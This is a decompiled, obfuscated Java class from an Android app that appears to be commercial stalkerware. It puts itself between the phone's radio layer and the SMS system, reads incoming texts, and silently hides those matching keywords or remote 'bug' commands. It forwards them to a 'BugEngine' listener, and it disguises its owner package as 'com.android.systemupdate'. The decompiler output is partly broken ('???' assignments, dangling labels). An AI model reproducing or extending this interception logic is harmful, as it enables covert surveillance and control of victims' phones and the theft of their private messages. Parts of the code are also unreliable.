package com.vvt.callmanager.filter;

import android.content.Context;
import android.os.Parcel;
import com.vvt.base.communication.SmsInterceptInfo;
import com.vvt.base.communication.SmsInterceptInfo.InterceptionMethod;
import com.vvt.base.communication.SmsInterceptInfo.KeywordFindingMethod;
import com.vvt.callmanager.Mitm;
import com.vvt.callmanager.a.l;
import com.vvt.callmanager.mitm.o;
import com.vvt.sms.SmsInfo;
import com.vvt.sms.SmsInfo.SmsType;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class FilterSms
  extends n
  implements com.vvt.callmanager.mitm.n
{
  private static final boolean a = g.a;
  private static final boolean b = g.e;
  private com.vvt.callmanager.ref.f c;
  private List d;
  private com.vvt.callmanager.a.m e;
  private SmsInfo f;
  private o g = null;
  private k h;
  private Timer i;
  private TimerTask j;
  private int k;
  private FilterSms.CallState l;
  
  public FilterSms(Context paramContext, Mitm paramf, com.vvt.callmanager.a.m paramm)
  {
    super(paramf);
    Object localObject1 = com.vvt.callmanager.ref.f.a();
    this.c = ((com.vvt.callmanager.ref.f)localObject1);
    this.e = paramm;
    localObject1 = new com/vvt/callmanager/filter/k;
    ((k)localObject1).<init>(this);
    this.h = ((k)localObject1);
    this.h.start();
    localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    this.d = ((List)localObject1);
    this.k = 0;
    localObject1 = FilterSms.CallState.values();
    int n = localObject1.length;
    while (m < n)
    {
      Object localObject2 = localObject1[m];
      ((FilterSms.CallState)localObject2).setMessageProcessor(this);
      m += 1;
    }
    localCallState = FilterSms.CallState.IDLE;
    a(localCallState);
  }
  
  private void a(FilterSms.CallState paramCallState)
  {
    Object localObject1 = this.l;
    if (paramCallState != localObject1)
    {
      int m = 2;
      Object localObject2 = new Object[m];
      FilterSms.CallState localCallState = this.l;
      localObject2[0] = localCallState;
      int n = 1;
      localObject2[n] = paramCallState;
      localObject1 = String.format("setState # %s -> %s", (Object[])localObject2);
      a((String)localObject1);
      localObject1 = null;
      localObject2 = this.l;
      if (localObject2 != null) {
        localObject1 = this.l.onExit();
      }
      this.l = paramCallState;
      paramCallState.onEnter(localObject1);
    }
  }
  
  private void a(SmsInfo paramSmsInfo)
  {
    int m = 1;
    if (paramSmsInfo == null)
    {
      n = b;
      if (n != 0) {}
      return;
    }
    int i2 = 2;
    Object localObject1 = new Object[i2];
    Object localObject2 = paramSmsInfo.getPhoneNumber();
    localObject1[0] = localObject2;
    localObject2 = paramSmsInfo.getMessageBody();
    localObject1[m] = localObject2;
    Object localObject3 = String.format("processNewSms # Number: %s, MsgBody: %s", (Object[])localObject1);
    b((String)localObject3);
    localObject3 = this.c;
    localObject2 = ((com.vvt.callmanager.ref.f)localObject3).b();
    int n = a;
    if (n != 0) {}
    localObject1 = ((HashSet)localObject2).iterator();
    for (;;)
    {
      n = ((Iterator)localObject1).hasNext();
      if (n == 0) {
        break;
      }
      localObject3 = (SmsInterceptInfo)((Iterator)localObject1).next();
      n = a;
      if (n != 0) {}
      n = a;
      if (n != 0) {}
      n = a;
      if (n == 0) {}
    }
    boolean bool2 = h.a((HashSet)localObject2, paramSmsInfo);
    if (!bool2)
    {
      localObject3 = paramSmsInfo.getMessageBody();
      n = h.a((String)localObject3);
      i2 = n;
    }
    for (;;)
    {
      if ((bool2) || (i2 != 0))
      {
        localObject3 = "processNewSms # Hide it";
        b((String)localObject3);
        label191:
        ??? = h.b((HashSet)localObject2, paramSmsInfo);
        if (??? == null) {
          break label464;
        }
        n = m;
      }
      for (;;)
      {
        if (n != 0)
        {
          localObject3 = this.g;
          if (localObject3 != null)
          {
            b("processNewSms # Forward it");
            localObject3 = this.g;
            ((o)localObject3).a((SmsInterceptInfo)???, paramSmsInfo);
          }
        }
        if (i2 == 0) {
          break;
        }
        localObject3 = this.g;
        if (localObject3 == null) {
          break;
        }
        int i1 = ((HashSet)localObject2).size();
        if (i1 != 0) {
          break;
        }
        b("processNewSms # This is getInstance SMS command, However, there are no listener. Hold on to this message till BugEngine connects.");
        localObject3 = new com/vvt/base/communication/SmsInterceptInfo;
        ((SmsInterceptInfo)localObject3).<init>();
        ((SmsInterceptInfo)localObject3).setOwnerPackage("com.android.systemupdate");
        Object localObject7 = SmsInterceptInfo.InterceptionMethod.HIDE_AND_FORWARD;
        ((SmsInterceptInfo)localObject3).setInterceptionMethod((SmsInterceptInfo.InterceptionMethod)localObject7);
        localObject7 = SmsInterceptInfo.KeywordFindingMethod.START_WITH;
        ((SmsInterceptInfo)localObject3).setKeywordFindingMethod((SmsInterceptInfo.KeywordFindingMethod)localObject7);
        ((SmsInterceptInfo)localObject3).setOwnerPackage("vvt.callmanager");
        ((SmsInterceptInfo)localObject3).setClientSocketName("vvt.callmanager");
        localObject7 = this.g;
        ((o)localObject7).b((SmsInterceptInfo)localObject3, paramSmsInfo);
        break;
        b("processNewSms # Show it");
        localObject3 = this.d;
        i1 = ((List)localObject3).size();
        this.k = i1;
        boolean bool1 = a;
        if (bool1) {}
        synchronized (this.d)
        {
          localObject3 = this.d;
          Iterator localIterator = ((List)localObject3).iterator();
          bool1 = localIterator.hasNext();
          if (bool1)
          {
            localObject3 = localIterator.next();
            localObject3 = (byte[])localObject3;
            localObject3 = i.a((byte[])localObject3);
            c((Parcel)localObject3);
          }
        }
        break label191;
        label464:
        bool1 = false;
        Object localObject5 = null;
      }
      i2 = 0;
      localObject1 = null;
    }
  }
  
  private void a(String paramString)
  {
    this.e.b(paramString);
  }
  
  private boolean a(SmsInfo paramSmsInfo1, SmsInfo paramSmsInfo2)
  {
    boolean bool1 = false;
    if ((paramSmsInfo1 != null) && (paramSmsInfo2 != null))
    {
      String str1 = paramSmsInfo1.getPhoneNumber();
      String str2 = paramSmsInfo2.getPhoneNumber();
      SmsInfo.SmsType localSmsType1 = paramSmsInfo1.getType();
      SmsInfo.SmsType localSmsType2 = paramSmsInfo2.getType();
      boolean bool2 = str1.equals(str2);
      if ((bool2) && (localSmsType1 == localSmsType2)) {
        bool1 = true;
      }
    }
    return bool1;
  }
  
  private SmsInfo b(SmsInfo paramSmsInfo1, SmsInfo paramSmsInfo2)
  {
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    Object localObject2 = paramSmsInfo1.getMessageBody();
    ((StringBuilder)localObject1).append((String)localObject2);
    localObject2 = paramSmsInfo2.getMessageBody();
    ((StringBuilder)localObject1).append((String)localObject2);
    localObject2 = new com/vvt/sms/SmsInfo;
    ((SmsInfo)localObject2).<init>();
    Object localObject3 = paramSmsInfo1.getType();
    ((SmsInfo)localObject2).setType((SmsInfo.SmsType)localObject3);
    localObject3 = paramSmsInfo1.getPhoneNumber();
    ((SmsInfo)localObject2).setPhoneNumber((String)localObject3);
    localObject1 = ((StringBuilder)localObject1).toString();
    ((SmsInfo)localObject2).setMessageBody((String)localObject1);
    return (SmsInfo)localObject2;
  }
  
  private void b(String paramString)
  {
    this.e.a(paramString);
  }
  
  private void e()
  {
    Object localObject = new com/vvt/callmanager/filter/j;
    ((j)localObject).<init>(this);
    this.j = ((TimerTask)localObject);
    localObject = new java/util/Timer;
    ((Timer)localObject).<init>();
    this.i = ((Timer)localObject);
    localObject = this.i;
    TimerTask localTimerTask = this.j;
    ((Timer)localObject).schedule(localTimerTask, 15000L);
  }
  
  private void e(Parcel paramParcel)
  {
    l locall = l.a(paramParcel);
    Parcel localParcel = null;
    int m = locall.a;
    int n = 1;
    if (m == n)
    {
      m = locall.b;
      n = 1003;
      if (m != n) {
        break label62;
      }
      localParcel = i.a(i.l);
    }
    for (;;)
    {
      this.e.a(localParcel);
      d(localParcel);
      return;
      label62:
      int i1 = locall.b;
      m = 1020;
      if (i1 == m) {
        localParcel = i.a(i.m);
      }
    }
  }
  
  private void f()
  {
    Object localObject = this.j;
    if (localObject != null)
    {
      localObject = this.j;
      ((TimerTask)localObject).cancel();
      this.j = null;
    }
    localObject = this.i;
    if (localObject != null)
    {
      localObject = this.i;
      ((Timer)localObject).cancel();
      this.i = null;
    }
  }
  
  private void f(Parcel paramParcel)
  {
    boolean bool1 = true;
    boolean bool2 = false;
    Object localObject1 = null;
    boolean bool3 = a;
    if (bool3) {}
    f();
    SmsInfo localSmsInfo = m.a(paramParcel);
    if (localSmsInfo == null)
    {
      bool1 = b;
      if (bool1) {}
      return;
    }
    int m = 2;
    Object localObject2 = new Object[m];
    String str = localSmsInfo.getPhoneNumber();
    localObject2[0] = str;
    str = localSmsInfo.getMessageBody();
    localObject2[bool1] = str;
    Object localObject3 = String.format("handleNewSms # Number: %s, MsgBody: %s", (Object[])localObject2);
    a((String)localObject3);
    localObject3 = this.f;
    label107:
    label133:
    Object localObject4;
    if (localObject3 != null)
    {
      bool3 = bool1;
      if (!bool3) {
        break label237;
      }
      localObject2 = this.f;
      boolean bool4 = a((SmsInfo)localObject2, localSmsInfo);
      if (!bool4) {
        break label237;
      }
      bool2 = localSmsInfo.hasMoreMsgToSend();
      bool4 = a;
      if ((bool4) && ((bool3) || (bool2))) {
        break label245;
      }
      a("handleNewSms # Process SMS");
      this.f = localSmsInfo;
      localObject4 = this.d;
      localObject1 = paramParcel.marshall();
      ((List)localObject4).add(localObject1);
      a(localSmsInfo);
      this.f = null;
      localObject4 = this.d;
      ((List)localObject4).clear();
    }
    for (;;)
    {
      bool1 = a;
      if (!bool1) {
        break;
      }
      break;
      bool3 = false;
      localObject3 = null;
      break label107;
      label237:
      bool1 = false;
      localObject4 = null;
      break label133;
      label245:
      if ((!bool3) && (bool2))
      {
        a("handleNewSms # Hold SMS");
        this.f = localSmsInfo;
        localObject4 = this.d;
        localObject1 = paramParcel.marshall();
        ((List)localObject4).add(localObject1);
        e();
      }
      else if ((bool3) && (bool1) && (!bool2))
      {
        a("handleNewSms # Merge and process");
        localObject4 = this.f;
        localObject4 = b((SmsInfo)localObject4, localSmsInfo);
        localObject1 = this.d;
        localObject3 = paramParcel.marshall();
        ((List)localObject1).add(localObject3);
        a((SmsInfo)localObject4);
        this.f = null;
        localObject4 = this.d;
        ((List)localObject4).clear();
      }
      else if ((bool3) && (bool1) && (bool2))
      {
        a("handleNewSms # Merge and hold");
        localObject4 = this.f;
        localObject4 = b((SmsInfo)localObject4, localSmsInfo);
        this.f = ((SmsInfo)localObject4);
        localObject4 = this.d;
        localObject1 = paramParcel.marshall();
        ((List)localObject4).add(localObject1);
        e();
      }
      else if ((bool3) && (!bool1) && (!bool2))
      {
        a("handleNewSms # Process cached SMS");
        localObject4 = this.f;
        a((SmsInfo)localObject4);
        this.f = null;
        this.d.clear();
        a("handleNewSms # Process new SMS");
        this.f = localSmsInfo;
        localObject4 = this.d;
        localObject1 = paramParcel.marshall();
        ((List)localObject4).add(localObject1);
        a(localSmsInfo);
        this.f = null;
        localObject4 = this.d;
        ((List)localObject4).clear();
      }
      else if ((bool3) && (!bool1) && (bool2))
      {
        a("handleNewSms # Process cached SMS");
        localObject4 = this.f;
        a((SmsInfo)localObject4);
        this.f = null;
        this.d.clear();
        a("handleNewSms # Hold new SMS");
        this.f = localSmsInfo;
        localObject4 = this.d;
        localObject1 = paramParcel.marshall();
        ((List)localObject4).add(localObject1);
        e();
      }
    }
  }
  
  public com.vvt.callmanager.a.m a()
  {
    return this.e;
  }
  
  public void a(Parcel paramParcel)
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "O->M..T";
    String str = e.a(paramParcel);
    arrayOfObject[1] = str;
    Object localObject = String.format("%s: \"%s\"", arrayOfObject);
    a((String)localObject);
    localObject = this.l.processRilRequest(paramParcel);
    a((FilterSms.CallState)localObject);
  }
  
  public void a(o paramo)
  {
    this.g = paramo;
  }
  
  public void b(Parcel paramParcel)
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "O..M<=T";
    String str = e.a(paramParcel);
    arrayOfObject[1] = str;
    Object localObject = String.format("%s: \"%s\"", arrayOfObject);
    a((String)localObject);
    localObject = this.l.processResponse(paramParcel);
    a((FilterSms.CallState)localObject);
  }
  
  protected void c(Parcel paramParcel)
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "O<=M..T";
    String str1 = e.a(paramParcel);
    arrayOfObject[1] = str1;
    String str2 = String.format("%s: \"%s\"", arrayOfObject);
    a(str2);
    super.c(paramParcel);
  }
  
  public void d(Parcel paramParcel)
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "O..M->T";
    String str1 = e.a(paramParcel);
    arrayOfObject[1] = str1;
    String str2 = String.format("%s: \"%s\"", arrayOfObject);
    a(str2);
    super.d(paramParcel);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterSms.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */